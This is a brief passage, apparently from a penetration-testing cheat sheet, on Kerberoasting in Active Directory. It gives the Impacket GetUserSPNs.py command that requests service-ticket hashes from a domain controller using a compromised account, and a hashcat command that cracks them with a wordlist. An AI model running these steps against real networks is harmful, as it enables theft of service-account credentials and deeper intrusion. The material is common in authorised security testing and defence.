Using a compromised account, use the user's TGT to request a TGS for a kerberoastable service account. This TGS is encrypted with the server's account hash.
 
### python3 GetUserSPNs.py <domain.local>/<user>:<password> -dc-ip <dc_ip> -request
 
### hashcat -a 0 -m 13100 hash.txt rockyou.txt